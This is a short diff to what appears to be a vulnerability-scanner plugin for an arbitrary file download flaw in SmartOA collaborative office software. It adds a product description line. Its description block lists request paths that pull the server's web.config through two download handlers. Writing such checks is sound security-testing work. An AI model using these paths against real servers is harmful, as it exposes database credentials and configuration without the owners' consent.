@@ -12,6 +12,7 @@ class Vuln(ABVuln):
     type = VulnType.FILE_DOWNLOAD  # 漏洞类型
     disclosure_date = '2014-08-11'  # 漏洞公布时间
     desc = '''
+        智明协同oa系统提供专业的oa自定义平台系统(SmartOA),能够快速根据企业需求打造随需而变的个性化oa、OA系统、OA软件、oa办公系统、oa办公软件,协同oa办公平台系统软件。
         力智软件SmartOA协同办公系统存在多个任意文件下载漏洞（泄漏数据库相关信息）。
         "/file/EmailDownload.ashx?url=~/web.config&name=web.config",
         "/file/UDFDownLoad.ashx?path=~/web.config&name=web.config",
